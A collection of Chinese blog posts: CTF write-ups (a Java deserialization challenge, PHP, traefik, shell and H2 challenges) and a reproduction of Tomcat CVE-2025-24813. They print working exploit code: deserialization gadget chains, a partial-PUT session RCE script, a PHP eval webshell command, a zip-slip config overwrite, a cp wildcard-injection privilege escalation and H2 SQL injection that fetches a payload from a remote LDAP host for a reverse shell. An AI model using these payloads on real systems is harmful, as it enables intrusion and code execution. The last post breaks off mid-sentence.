[{"categories":["Java安全","WP"],"contents":"前言 一个关于本地打通无数次但远程0次的故事\n题目分析 题目直接给了一个反序列化的入口点\n其中有两层防御\n对我们的反序列化数据流中的明文进行简单判断过滤 使用了一个自定义反序列化类来对我们的反序列化数据流进行反序列化 其中自定义化反序列化类代码如下\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.ezjav.utils; import java.io.BufferedReader; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; import java.util.ArrayList; public class MyObjectInputStream extends ObjectInputStream { private String[] denyClasses; public MyObjectInputStream(ByteArrayInputStream var1) throws IOException { super(var1); ArrayList\u0026lt;String\u0026gt; classList = new ArrayList(); InputStream file = MyObjectInputStream.class.getResourceAsStream(\u0026#34;/blacklist.txt\u0026#34;); BufferedReader var2 = new BufferedReader(new InputStreamReader(file)); String var4; while((var4 = var2.readLine()) != null) { classList.add(var4.trim()); } this.denyClasses = new String[classList.size()]; classList.toArray(this.denyClasses); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); int var5 = this.denyClasses.length; for(int var6 = 0; var6 \u0026lt; var5; ++var6) { String denyClass = this.denyClasses[var6]; if (className.startsWith(denyClass)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, className); } } return super.resolveClass(desc); } } 从blacklist中读取baned类，且在resolveClass中进行过滤\nblacklist.txt\njavax.management.BadAttributeValueExpException com.sun.org.apache.xpath.internal.objects.XString java.rmi.MarshalledObject java.rmi.activation.ActivationID javax.swing.event.EventListenerList java.rmi.server.RemoteObject javax.swing.AbstractAction javax.swing.text.DefaultFormatter java.beans.EventHandler java.net.Inet4Address java.net.Inet6Address java.net.InetAddress java.net.InetSocketAddress java.net.Socket java.net.URL java.net.URLStreamHandler com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl java.rmi.registry.Registry java.rmi.RemoteObjectInvocationHandler java.rmi.server.ObjID java.lang.System javax.management.remote.JMXServiceUR javax.management.remote.rmi.RMIConnector java.rmi.server.RemoteObject java.rmi.server.RemoteRef javax.swing.UIDefaults$TextAndMnemonicHashMap java.rmi.server.UnicastRemoteObject java.util.Base64 java.util.Comparator java.util.HashMap java.util.logging.FileHandler java.security.SignedObject javax.swing.UIDefaults 解决思考 第一步 对于第一层防御，我们可以很简单的绕过，对此我有以下两种绕过方式\nUTF8OverlongEncoding 不使用存在这些字符串的类(com.sun,naming,jdk.jfr) 这个很简单，就不多说了\n第二层的resolveClass,我们只能选择不使用blacklist上面的类来达到攻击目的，经过我的排查，我手里刚好就有这么一段链子任何关键类都不在blacklist中，那就是springaop链\n简单小引-\u0026gt; https://gsbp0.github.io/post/springaop/\n在我上面的文章中，我最后是用的toString来触发aop动态代理的invoke方法，不过我在文章提到过,只要不是equals,hashcode这俩方法触发invoke,其他都是可以走完整条反序列化链\n我在比赛过程中由题目中存在的User类的compare方法受到启发，选择了CC2和CB中都用到的PriorityQueue那一段来触发compare\n下面是cb的部分poc\nBeanComparator CB=new BeanComparator(); CB.setProperty(\u0026#34;outputProperties\u0026#34;); PriorityQueue PQ=new PriorityQueue(1); PQ.add(1); PQ.add(2); reflectSet(PQ,\u0026#34;comparator\u0026#34;,CB); reflectSet(PQ,\u0026#34;queue\u0026#34;,new Object[]{TPI,TPI}); ok，那直接拼到aop链的后面看看情况\n结果触发了报错\nException in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: Can not set final java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy3 at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167) at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171) at sun.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:83) at java.lang.reflect.Field.set(Field.java:764) at Utils.Util.setFieldValue(Util.java:38) at Test.main(Test.java:30) 因为我们的proxy类没有实现comparator接口，那这里我们可以通过在外面再次包一层代理，且代理comparator接口即可\n至于触发类，我们可以选择LdapAttribute这么一个jndi注入类，也可以选择JdbcRowSetImpl，不过需要utf8overlong麻烦一点\nPOC import Utils.Util; import com.sun.rowset.JdbcRowSetImpl; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AbstractAspectJAdvice; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import java.lang.reflect.*; import java.util.*; public class Test { public static void main(String[] args) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:50389/3fa0f4\u0026#34;); Method method=jdbcRowSet.getClass().getMethod(\u0026#34;getDatabaseMetaData\u0026#34;); System.out.println(method); SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet); AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory); Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class); Proxy finalproxy=(Proxy) getBProxy(proxy1,new Class[]{Comparator.class}); PriorityQueue PQ=new PriorityQueue(1); PQ.add(1); PQ.add(2); Util.setFieldValue(PQ,\u0026#34;comparator\u0026#34;,finalproxy); Util.setFieldValue(PQ,\u0026#34;queue\u0026#34;,new Object[]{proxy1,proxy1}); System.out.println(Util.serialize(PQ)); Util.deserialize(Util.serialize(PQ)); } public static Object getBProxy(Object obj,Class[] clazzs) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler); return proxy; } public static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj; DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class})); advisedSupport.addAdvisor(advisor); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } } 第二步 第一种方法-Ldap_SERIALIZE_DATA 家喻户晓的办法，因为题目jar包上的编译版本是11,还没有受到强制类隔离的要求，可以随便打Jackson那一套反序列化，或者是再走一边我们的AOP链但触发类换成可RCE的Template类\n这里我用的JNDIMap\nok本地成功RCE\n但是放到远程直接失败GG，我开始思考我的问题\nok可能是环境里设置了com.sun.jndi.ldap.object.trustSerialData为false，合理合理\n开始第二种方法\n第二种方法-hsql二次反序列化 Ok,我们这里直接看题目的依赖\ndruid+hsql，再加上题目名justDeserialize，指向性很明显了，我们打jndi_Reference触发DruidDataSourceFactory的getObjectInstance方法来打hsql-JDBC，触发hsql里的SerializationUtils二次反序列化实现RCE\n这里我使用了java-chains\n二次反序列化数据塞的我自己生成的AOP+springEcho内存马链子,这里也可以用这个工具自带的反序列化生成工具生成，也挺好用的\n然后再打！\nok本地又通了,打远程！\n那么问题再次来袭，我抱着满怀期待再去打远程的时候，又没通，直接道心崩溃了，后续不知道怎么打了，并且也没有题目环境，不知道啥问题qaq\n结尾 不是很清楚这远程的环境，比赛的时候破大防，如果有师傅在比赛的时候打通了这道题希望能告诉我一下咋打的QAQ\n","date":"2025-03-24T22:00:00+08:00","permalink":"http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/","section":"post","tags":null,"title":"软件攻防赛现场赛上对justDeserialize攻击的几次尝试"},{"categories":["Java安全","CVE"],"contents":"前言 出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下\n通报 关于漏洞的通报细节如下\n一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来\n信息泄漏/篡改 ReadOnly为false\n支持partial PUT方法\n攻击者知道敏感文件的名称\n安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）\n反序列化RCE ReadOnly为false 支持partial PUT方法 服务开启以文件为存储形式的持久化链接，并且采用默认位置 有能够引起反序列化漏洞的依赖 环境搭建 我参考的这篇文章搭建的环境\nhttps://juejin.cn/post/7331544684290228250\n接下来修改readonly\ntomcat目录/conf/web.xml\n\u0026lt;servlet\u0026gt;\r\u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt;\r\u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt;\r\u0026lt;/servlet\u0026gt; 开启持久化链接文件模式\ntomcat目录/conf/context.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\r\u0026lt;!--\rLicensed to the Apache Software Foundation (ASF) under one or more\rcontributor license agreements. See the NOTICE file distributed with\rthis work for additional information regarding copyright ownership.\rThe ASF licenses this file to You under the Apache License, Version 2.0\r(the \u0026#34;License\u0026#34;); you may not use this file except in compliance with\rthe License. You may obtain a copy of the License at\rhttp://www.apache.org/licenses/LICENSE-2.0\rUnless required by applicable law or agreed to in writing, software\rdistributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS,\rWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\rSee the License for the specific language governing permissions and\rlimitations under the License.\r--\u0026gt;\r\u0026lt;!-- The contents of this file will be loaded for each web application --\u0026gt;\r\u0026lt;Context\u0026gt;\r\u0026lt;!-- Default set of monitored resources. If one of these changes, the --\u0026gt;\r\u0026lt;!-- web application will be reloaded. --\u0026gt;\r\u0026lt;WatchedResource\u0026gt;WEB-INF/web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;WatchedResource\u0026gt;WEB-INF/tomcat-web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;WatchedResource\u0026gt;${catalina.base}/conf/web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;!-- Uncomment this to disable session persistence across Tomcat restarts --\u0026gt;\r\u0026lt;!--\r\u0026lt;Manager pathname=\u0026#34;\u0026#34; /\u0026gt;\r--\u0026gt;\r\u0026lt;Manager className=\u0026#34;org.apache.catalina.session.PersistentManager\u0026#34;\rdebug=\u0026#34;0\u0026#34;\rsaveOnRestart=\u0026#34;false\u0026#34;\rmaxActiveSession=\u0026#34;-1\u0026#34;\rminIdleSwap=\u0026#34;-1\u0026#34;\rmaxIdleSwap=\u0026#34;-1\u0026#34;\rmaxIdleBackup=\u0026#34;-1\u0026#34;\u0026gt;\r\u0026lt;Store className=\u0026#34;org.apache.catalina.session.FileStore\u0026#34; directory=\u0026#34;\u0026#34;/\u0026gt;\r\u0026lt;/Manager\u0026gt;\r\u0026lt;/Context\u0026gt; 往pom.xml下塞入CC依赖\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; 漏洞复现 开启服务\n然后跑个cc的poc\npackage org.example;\rimport org.apache.commons.collections.Transformer;\rimport org.apache.commons.collections.functors.ChainedTransformer;\rimport org.apache.commons.collections.functors.ConstantTransformer;\rimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport java.io.*;\rimport java.lang.annotation.Target;\rimport java.util.*;\rimport java.lang.reflect.*;\rpublic class Main {\rpublic static void main(String[] args) throws Exception {\rString cmd=\u0026#34;open -a calculator\u0026#34;;\rTransformer[] transformers =new Transformer[]{\rnew ConstantTransformer(Runtime.class),\rnew InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[0]}),\rnew InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),\rnew InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{cmd})\r};\rChainedTransformer chainedTransformer=new ChainedTransformer(transformers);\rHashMap hsmap=new HashMap();\rhsmap.put(\u0026#34;value\u0026#34;,\u0026#34;test\u0026#34;);\rMap transformedMap=TransformedMap.decorate(hsmap,null,chainedTransformer);\rClass aclass=Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor constructor=aclass.getDeclaredConstructor(Class.class,Map.class);\rconstructor.setAccessible(true);\rObject handler = constructor.newInstance(Target.class,transformedMap);\rFileOutputStream bao=new FileOutputStream(\u0026#34;ser\u0026#34;);\rObjectOutputStream oos=new ObjectOutputStream(bao);\roos.writeObject(handler);\roos.close();\r}\r} 得到ser文件之后再跑下面脚本\nimport requests\rdata=open(\u0026#34;ser\u0026#34;,\u0026#34;rb\u0026#34;).read()\rheaders={\u0026#34;Content-Range\u0026#34;:\u0026#34;bytes 0-10000/67589\u0026#34;}\rurl=\u0026#34;http://127.0.0.1:8081/evil/session\u0026#34;\rrequests.put(url,headers=headers,data=data)\rrequests.get(url,headers={\u0026#34;Cookie\u0026#34;:\u0026#34;JSESSIONID=.evil\u0026#34;}) 原理分析 其一 漏洞点在DefaultServlet下的doPut方法中调用 executePartialPut方法\n在 executePartialPut方法中,根据传入的path，request创建临时文件，保存地址为当前ServletContext下的临时文件夹的根目录下面，且将path中的/转化为了.\nprotected File executePartialPut(HttpServletRequest req, Range range, String path) throws IOException {\r// Append data specified in ranges to existing content for this\r// resource - create a temp. file on the local filesystem to\r// perform this operation\rFile tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);\r// Convert all \u0026#39;/\u0026#39; characters to \u0026#39;.\u0026#39; in resourcePath\rString convertedResourcePath = path.replace(\u0026#39;/\u0026#39;, \u0026#39;.\u0026#39;);\rFile contentFile = new File(tempDir, convertedResourcePath);\rif (contentFile.createNewFile()) {\r// Clean up contentFile when Tomcat is terminated\rcontentFile.deleteOnExit();\r}\rtry (RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, \u0026#34;rw\u0026#34;)) {\rWebResource oldResource = resources.getResource(path);\r// Copy data in oldRevisionContent to contentFile\rif (oldResource.isFile()) {\rtry (BufferedInputStream bufOldRevStream =\rnew BufferedInputStream(oldResource.getInputStream(), BUFFER_SIZE)) {\rint numBytesRead;\rbyte[] copyBuffer = new byte[BUFFER_SIZE];\rwhile ((numBytesRead = bufOldRevStream.read(copyBuffer)) != -1) {\rrandAccessContentFile.write(copyBuffer, 0, numBytesRead);\r}\r}\r}\rrandAccessContentFile.setLength(range.length);\r// Append data in request input stream to contentFile\rrandAccessContentFile.seek(range.start);\rint numBytesRead;\rbyte[] transferBuffer = new byte[BUFFER_SIZE];\rtry (BufferedInputStream requestBufInStream = new BufferedInputStream(req.getInputStream(), BUFFER_SIZE)) {\rwhile ((numBytesRead = requestBufInStream.read(transferBuffer)) != -1) {\rrandAccessContentFile.write(transferBuffer, 0, numBytesRead);\r}\r}\r}\rreturn contentFile;\r} 在调用executePartialPut之前有个要求，需要我们的range不为空或IGNORE,其实就是需要我们添加一个合法的Content-Range请求头便可以成功创建\nprotected Range parseContentRange(HttpServletRequest request, HttpServletResponse response) throws IOException {\r// Retrieving the content-range header (if any is specified\rString contentRangeHeader = request.getHeader(\u0026#34;Content-Range\u0026#34;);\rif (contentRangeHeader == null) {\rreturn IGNORE;\r}\rif (!allowPartialPut) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\rContentRange contentRange = ContentRange.parse(new StringReader(contentRangeHeader));\rif (contentRange == null) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\r// bytes is the only range unit supported\rif (!contentRange.getUnits().equals(\u0026#34;bytes\u0026#34;)) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\r// TODO: Remove the internal representation and use Ranges\r// Convert to internal representation\rRange range = new Range();\rrange.start = contentRange.getStart();\rrange.end = contentRange.getEnd();\rrange.length = contentRange.getLength();\rif (!range.validate()) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\rreturn range;\r} 我这里成功put之后，缓存文件所在文件夹位于apache-tomcat-9.0.85-src/work/Catalina/localhost/ROOT，\n其二 session文件的默认存储点正好位于当前Context的临时文件夹下\nFileStore.load\n用户在使用JSESSIONID=id的情况下访问服务，FileStore会自动的去临时文件夹下寻找名字为id.session的文件并且进行反序列化操作 所以攻击思路就串联起来了\n攻击者通过partialPut方法往服务临时文件夹塞入存有反序列化数据的文件 攻击者再次构造JSESSIONID为.filename.session的请求，触发反序列化攻击 信息泄露\u0026amp;篡改 这里我看了一会儿没思考出来这个信息泄漏的手法，讲讲我在思考过程中发现的一些可疑点吧(方向不保证对)\n在我们创建了range的情况下，下方这个if分支语句下我们能够执行两端代码，一个是PartialPut方法，另一个则是根据contentFile来创建一个\n不同于resourceInputStream = req.getInputStream();的直接从req中读取我们的输入内容，这里的是根据我们的路径寻找对应文件下的内容\n这里需要注意的是，我们put的路径也并非是需要文件夹下不存在的文件，存在的文件我们也可以执行partialPut方法，方法会根据我们的Content-Range头来讲我们put的body内容覆盖对应range的数据，这里简单展示一下\n访问已存在的123文件\nput 123文件 内容为66 range为Content-Range:bytes 200-1000/67589(range随便设的，我这个文件长度没这么长，这里情况是覆盖最后n位等同于我们的put进的内容)\n现在看一眼123\n所以说partialPut方法读取了临时文件夹下的对应文件内容\n随后resourceInputStream进入了resources.write方法,这个方法下有个注释有点怪\n这个cache好像是用来给正在上传的文件加锁的？没有被remove的话无法被访问的样子\n这里有这么些文件地址\n但是后面我自己测试，发现就算在这个cache里好像也能访问，不知道啥原因了(晕)\n那我其实对此大致的思路就有两种\n通过某些报错将resourceInputStream的内容带出来，造成泄漏 (我的这个cache环境有问题的情况下QAQ)在cache中的文件路径无法访问，且敏感文件在网站目录下的子目录(文件)中，通过我们恶意的往对应路径构造put请求，将该敏感文件从cache中remove掉，从而能够访问这个敏感文件(不过WEB-INF和MATA-INF还是访问不到，tomcat已经硬编码在代码中不准以这俩玩意开头了) 结尾 只复现出来了RCE的洞，简单提了一下我在信息泄露这方面的一些思路，如果文章内容有错误还请师傅联系我纠正😭~\n","date":"2025-03-12T18:00:00+08:00","permalink":"http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","section":"post","tags":null,"title":"[Tomcat]CVE-2025-24813复现及原理分析"},{"categories":["WP"],"contents":"Gavatar 一个php服务\n这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以\nif (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用\n也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用\nhttps://www.ambionics.io/blog/iconv-cve-2024-2961-p1\n因为不是直接返回文件内容，而是需要我们从avatar.php中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可\ndef download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://39.106.16.204:20871/avatar.php?user=123\u0026#34;) print(response) data = response.text return base64.decode(data) 然后跑exp就好了\npython test.py http://39.106.16.204:20871/upload.php \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; tarefik go服务，代码很少，只有一个main.go,这里可以看到直接写了一个flag接口获取flag\nr.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) 但是我们可以从Dockerfile里面看到实际上并不是直接将服务暴露在外网，而是使用了tarefik进行了一个代理转发\ntraefik.yml\nproviders: file: filename: /app/.config/dynamic.yml entrypoints: web: address: \u0026#34;:80\u0026#34; dynamic.yml\nhttp: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy 只转发了index和upload两个接口\n我们这里可以从官方文档知道，转发端口这一些的服务配置，都是可以热加载的\n那我们接下来的目的就是想能否可以重写dynamic.yml，写入我们的配置，将flag端口转发出来就能达到getflag\n我们将目光转到upload接口上\nr.POST(\u0026#34;/public/upload\u0026#34;, func(c *gin.Context) { file, err := c.FormFile(\u0026#34;file\u0026#34;) if err != nil { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;File upload failed\u0026#34;}) return } randomFolder := randFileName() destDir := filepath.Join(uploadDir, randomFolder) if err := os.MkdirAll(destDir, 0755); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to create directory\u0026#34;}) return } zipFilePath := filepath.Join(uploadDir, randomFolder+\u0026#34;.zip\u0026#34;) if err := c.SaveUploadedFile(file, zipFilePath); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to save uploaded file\u0026#34;}) return } if err := unzipFile(zipFilePath, destDir); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to unzip file\u0026#34;}) return } c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: fmt.Sprintf(\u0026#34;File uploaded and extracted successfully to %s\u0026#34;, destDir), }) }) unzipFile\nfunc unzipFile(zipPath, destDir string) error { zipReader, err := zip.OpenReader(zipPath) if err != nil { return err } defer zipReader.Close() for _, file := range zipReader.File { filePath := filepath.Join(destDir, file.Name) if file.FileInfo().IsDir() { if err := os.MkdirAll(filePath, file.Mode()); err != nil { return err } } else { err = unzipSimpleFile(file, filePath) if err != nil { return err } } } return nil } 这里需要我们上传一个zip文件，然后放到unzipFile函数下进行一个解压\n看到unzipFile中使用了filepath.Join后，联想到了python里的path.join，想着能否把压缩包内的文件名写成../开头的形式，这样的话我们就能成功目录穿越，然后覆盖配置文件了\n尝试出来是可以的，这里我写了个python脚本来达到目的\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary=open(\u0026#34;config/dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() zipFile = zipfile.ZipFile(\u0026#34;test2.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test2.zip\u0026#34;) zipFile.writestr(\u0026#34;../../.config/dynamic.yml\u0026#34;, binary) zipFile.writestr(\u0026#34;1234.txt\u0026#34;,binary) zipFile.close() except IOError as e: raise e 然后dynamic.yml内容如下,由于XFF头的存在，我们还需要额外加一个添加请求头的中间件\nhttp: middlewares: # 定义添加请求头的中间件 add-headers: headers: customRequestHeaders: X-Forwarded-For: 127.0.0.1 services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy middlewares: - add-headers # 应用中间件 upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy middlewares: - add-headers # 应用中间件 flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - add-headers backup 在html的最下面我们可以看到一个注释\n然后我们简单绕一下非法传参名就可以了，这是一个shell接口，我们能够直接发命令,所以这里弹个shell方便接下来的操作\nflag是400权限，我们这里需要提权\n根目录下面发现了一个backup.sh，内容如下\n#!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done 一个死循环，重复进行了cp chmod的操作\n这里我去ps aux看了一眼，是root一直在执行 那我们接下来就是在这个backup.sh上做下一步操作了\n我们想要的是能否在primary目录下创建一个指向/flag的软连接，然后cp将软连接所指向的flag文件复制到backup文件夹下，再利用内部自带的chmod命令使我们可读\n但是这里cp使用了-P参数，在help中对该参数解释如下\n-P, --no-dereference never follow symbolic links in SOURC 这不是寄了吗?\n但是cp的对象是*参数，这个*参数可以帮助我们注入参数项(一些命令的提权手法就是用到这个操作比如chmod tar等等,不了解的可以上网搜搜)\n我们想要的参数项是这个,允许复制软连接所对应的文件\n-L, --dereference always follow symbolic links in SOURCE 由于两个相反的参数会被位置较后的参数所覆盖，我们接下来的操作就是\n创建一个文件名为-L的文件 创建指向flag的软连接 等sh执行 cat flag 命令如下\ncd /var/www/html/primary \u0026gt;-L ln -s /flag flag cd ../backup cat flag EasyDB 服务给我们的有用接口只有一个登陆接口\n@PostMapping({\u0026#34;/login\u0026#34;}) public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException { if (this.userService.validateUser(username, password)) { session.setAttribute(\u0026#34;username\u0026#34;, username); return \u0026#34;redirect:/\u0026#34;; } else { model.addAttribute(\u0026#34;error\u0026#34;, \u0026#34;Invalid username or password\u0026#34;); return \u0026#34;login\u0026#34;; } } validateUser中存在着sql注入漏洞\npublic boolean validateUser(String username, String password) throws SQLException { String query = String.format(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;%s\u0026#39; AND password = \u0026#39;%s\u0026#39;\u0026#34;, username, password); if (!SecurityUtils.check(query)) { return false; } else { Throwable var8; try (Statement stmt = this.connection.createStatement()) { stmt.executeQuery(query); ResultSet resultSet = stmt.getResultSet(); Throwable var7 = null; try { var8 = resultSet.next(); } catch (Throwable var31) { var8 = var31; var7 = var31; throw var31; } finally { if (resultSet != null) { if (var7 != null) { try { resultSet.close(); } catch (Throwable var30) { var7.addSuppressed(var30); } } else { resultSet.close(); } } } } return (boolean)var8; } } 然后数据库类型是h2数据库，且executeQuery()支持解析多条语句，那就是很平常的h2打法了，因为题目出网，绕黑名单我用的是JNDI注入，不过不出网的话也可以打其他的，方法很多\npayload如下\nadmin\u0026#39;;CREATE ALIAS abc AS \u0026#39;String rce(String cmd) throws Exception { new javax.naming.InitialContext().lookup(cmd); return \u0026#34;123\u0026#34;;}\u0026#39;;--\u0026amp;password=123 admin\u0026#39;;CALL abc (\u0026#39;ldap://ip:1389/Deserialize/Jackson/Command/反弹shell命令\u0026#39;);--\u0026amp;password=123 display 这题猪了，一开始以为是DOMPurify的0day，看了一个多小时没戏直接跑路玩游戏去了\n第二天看到hint出了之后很快就有人解了才返回来看这道题,结果才发现\nconst sanitizedText = 